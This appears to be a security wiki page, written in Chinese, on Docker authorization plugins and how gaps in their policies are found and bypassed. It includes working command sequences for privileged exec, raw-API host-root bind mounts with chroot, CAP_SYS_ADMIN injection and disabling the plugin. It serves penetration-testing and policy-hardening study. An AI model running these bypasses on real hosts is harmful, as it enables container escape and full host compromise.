# Runtime Authorization Plugins

## 概述

Runtime authorization plugins 是一层额外的策略层，用于决定调用方是否可以执行某项 daemon 操作。Docker 是经典示例。默认情况下，任何能够与 Docker daemon 通信的用户，实际上都能对其进行广泛控制。Authorization plugins 会检查经过认证的用户以及请求的 API 操作，然后根据策略允许或拒绝请求，从而尝试收紧这一模型。

这一主题值得单独介绍，因为当攻击者已经能够访问 Docker API，或已经是 `docker` 组中的用户时，exploitation model 会发生变化。在此类环境中，问题不再只是“我能否访问 daemon？”，还包括“daemon 是否受到 authorization layer 的限制？如果受到限制，能否通过未处理的 endpoints、弱 JSON 解析，或 plugin-management permissions 绕过该层？”

## 操作

当请求到达 Docker daemon 时，authorization subsystem 可以将请求上下文传递给一个或多个已安装的 plugins。Plugin 可以看到经过认证的用户身份、请求详情、选定的 headers，以及在 content type 合适时请求或响应 body 的部分内容。多个 plugins 可以串联使用，只有所有 plugins 都允许请求时，访问才会被授予。

这种模型听起来很严密，但其安全性完全取决于 policy author 对 API 的理解是否完整。如果某个 plugin 会阻止 `docker run --privileged`，却忽略 `docker exec`，遗漏顶层 `Binds` 等备用 JSON keys，或允许 plugin administration，那么它可能造成限制很严格的假象，同时仍然留下直接的 privilege-escalation paths。

## 常见 Plugin 目标

策略审查的重要领域包括：

- container creation endpoints
- `HostConfig` 字段，例如 `Binds`、`Mounts`、`Privileged`、`CapAdd`、`PidMode` 以及 namespace-sharing options
- `docker exec` 行为
- plugin management endpoints
- 任何能够间接触发预期 policy model 之外 runtime actions 的 endpoint

历史上，Twistlock 的 `authz` plugin，以及 `authobot` 等简单的 educational plugins，使这一模型易于研究，因为它们的 policy files 和 code paths 展示了 endpoint-to-action mapping 的实际实现方式。对于 assessment 工作而言，重要的经验是：policy author 必须理解完整的 API surface，而不能只关注最明显的 CLI commands。

## 滥用

首要目标是了解实际被阻止的内容。如果 daemon 拒绝某项操作，错误信息通常会 leak plugin 名称，从而帮助识别正在使用的控制措施：
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
如果需要更广泛的 endpoint profiling，`docker_auth_profiler` 等工具会很有用，因为它们可以自动化检查 plugin 实际允许哪些 API 路由和 JSON 结构这一原本重复的任务。

如果环境使用自定义 plugin，并且你可以与 API 交互，请枚举实际被过滤的对象字段：
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
这些检查很重要，因为许多授权失败是特定于字段的，而不是特定于概念的。插件可能会拒绝某种 CLI 模式，却不会完全阻止等效的 API 结构。

### 完整示例：`docker exec` 在容器创建后增加权限

一个阻止创建 privileged 容器、但允许创建 unconfined 容器并使用 `docker exec` 的策略，仍然可能被绕过：
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
如果 daemon 接受第二步，用户就重新获得了一个位于 container 内的 privileged interactive process，而策略作者原本认为该 process 已受到限制。

### 完整示例：通过 Raw API 执行 Bind Mount

某些存在缺陷的策略只检查一种 JSON 结构。如果 root filesystem 的 bind mount 未被一致地阻止，仍然可以挂载 host：
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
同样的思路也可能出现在 `HostConfig` 下：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
影响是完全逃逸主机文件系统。值得注意的是，此绕过源于策略覆盖不完整，而不是 kernel bug。

### 完整示例：未检查的 capability attribute

如果策略忘记过滤与 capability 相关的 attribute，攻击者可能创建一个重新获得危险 capability 的容器：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
一旦存在 `CAP_SYS_ADMIN` 或类似的强大 capability，[capabilities.md](protections/capabilities.md) 和 [privileged-containers.md](privileged-containers.md) 中介绍的许多 breakout 技术便可使用。

### 完整示例：禁用插件

如果允许执行插件管理操作，最干净的 bypass 方式可能是完全关闭该控制：
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
这是控制平面层面的策略失效。授权层虽然存在，但原本应受其限制的用户仍然保留禁用该层的权限。

## 检查

这些命令旨在确定是否存在策略层，以及该策略层看起来是完整的还是仅停留在表面。
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
这里有什么值得关注的：

- 包含 plugin 名称的拒绝消息可以确认存在 authorization layer，并且通常会暴露具体的实现方式。
- 攻击者可见的 plugin 列表可能足以发现是否可以执行 disable 或 reconfigure 操作。
- 如果某项 policy 只阻止明显的 CLI 操作，却不阻止原始 API 请求，在证明其无法绕过之前，都应将其视为可绕过。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 默认未启用 | 除非配置了 authorization plugin，否则 Daemon 访问实际上是全有或全无 | 不完整的 plugin policy、使用黑名单而不是 allowlist、允许 plugin 管理、字段级盲点 |
| Podman | 没有常见的直接等价机制 | Podman 通常更多依赖 Unix permissions、rootless execution 以及 API exposure 决策，而不是 Docker 风格的 authz plugin | 广泛暴露 rootful Podman API、socket permissions 薄弱 |
| containerd / CRI-O | 控制模型不同 | 这些 Runtime 通常依赖 socket permissions、node trust boundaries 以及更高层的 orchestrator controls，而不是 Docker authz plugin | 将 socket 挂载到 workloads 中、node-local trust assumptions 薄弱 |
| Kubernetes | 在 API-server 和 kubelet 层使用 authn/authz，而不是 Docker authz plugin | Cluster RBAC 和 admission controls 是主要的 policy layer | RBAC 权限过宽、admission policy 薄弱、直接暴露 kubelet 或 Runtime API |

{{#include ../../../banners/hacktricks-training.md}}
